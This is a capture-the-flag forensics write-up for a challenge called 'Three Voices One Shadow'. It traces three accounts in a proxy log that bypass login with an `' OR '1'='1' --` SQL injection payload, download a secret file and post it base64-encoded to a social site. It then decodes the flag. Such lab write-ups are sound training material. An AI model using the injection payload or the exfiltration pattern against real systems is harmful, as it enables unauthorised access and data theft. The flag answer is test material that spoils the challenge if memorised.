---
title: "Three Voices One Shadow"
ctf: "CSC-SNIST"
date: 2026-07-10
category: forensics
difficulty: medium
points: 250
flag_format: "cyberstrike{...}"
author: "retr0"
---

# Three Voices One Shadow

## Summary

A transparent proxy log captures an attack on `fahhh.com`. Three usernames (`godofi363`, `godofd363`, `godofk363` @gmail.com) perform SQL injection (`' OR '1'='1' --`) to bypass login, exfiltrate `/files/secret.txt`, then post the base64-encoded stolen secret to a public social media platform (`x.in` / Twitter). Decoding the posted status reveals the flag.

## Solution

### Step 1: Identify the three attacker identities

The proxy log shows brute-force login attempts from internal IPs (192.168.1.101–106) using three gmail accounts that all share the pattern `godof[ilk]363@gmail.com`:

| Email | IPs used | User-Agent |
|---|---|---|
| `godofi363@gmail.com` | 192.168.1.101, .104 | Firefox/115 (Linux) |
| `godofd363@gmail.com` | 192.168.1.102, .105 | Firefox/40.1 (Win6.1) |
| `godofk363@gmail.com` | 192.168.1.103, .106 | Chrome/121 |

All three eventually succeed with the same SQL injection payload (line 45, 60, 70):

```
email=godofi363%40gmail.com&password=As%27+OR+%271%27%3D%271%27+--+
```

Decoded: `As' OR '1'='1' --` — classic SQLi auth bypass. WAF logged it (rule 942100) but PASSED with score 5.

### Step 2: Trace the exfiltration

After SQLi login, all three session tokens access the same file (lines 74, 79, 83):

```
GET /files/secret.txt HTTP/1.1  session_token=f4c1e829d73a  (godofi363)
GET /files/secret.txt HTTP/1.1  session_token=b9d3f710c42e  (godofd363)
GET /files/secret.txt HTTP/1.1  session_token=c7a2e519b83d  (godofk363)
```

### Step 3: Follow the trail to the "Public's Open Stage"

After exfiltration, IP `192.168.1.102` browses to `x.in` (Twitter/X — the "Public's Open Stage") and posts a status (line 97):

```
POST /api/v1/statuses HTTP/1.1
req_body="status=Y3liZXJzdGlrZXtuMF9zZWNyZXRfaGVyZX0=&visibility=public&media_ids=[]"
```

### Step 4: Decode the posted secret

```python
import base64
flag = base64.b64decode("Y3liZXJzdGlrZXtuMF9zZWNyZXRfaGVyZX0=").decode()
print(flag)  # cyberstike{n0_secret_here}
```

The base64 decodes to `cyberstike{n0_secret_here}` (the attacker typo'd "cyberstike" missing an 'r'). Per the challenge's flag format `cyberstrike{...}`, the flag is:

## Flag

```
cyberstrike{n0_secret_here}
```
